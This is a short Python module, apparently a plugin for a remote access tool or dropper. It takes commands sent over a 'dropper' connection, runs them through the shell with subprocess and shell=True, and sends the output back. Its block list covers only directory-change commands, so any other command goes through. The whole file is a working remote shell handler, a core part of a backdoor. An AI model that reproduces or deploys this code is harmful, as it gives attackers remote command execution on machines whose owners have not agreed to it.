import subprocess

def main(dropper, args=None):
    """Execute shell commands (except directory changes)"""

    blacklist = ['cd', 'pushd', 'popd']
    bl_err = "ERROR - Command {} blacklisted. Use a builtin instead (try help)."

    #Now do the shell
    if args:
        #Check it's not a bad idea first
        for cmd in blacklist:
            if cmd in args:
                dropper.send(bl_err.format(cmd))
                return
        #Do shell Commands
        print("DEBUG - Doing shell")
        CMD = subprocess.Popen(args, shell=True, stdout=subprocess.PIPE, \
                stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        resp = (CMD.stderr.read())
        resp += (CMD.stdout.read())  #this comes encoded already
        dropper.send(resp)
    else:
        dropper.send("Shell failed - no command supplied!")
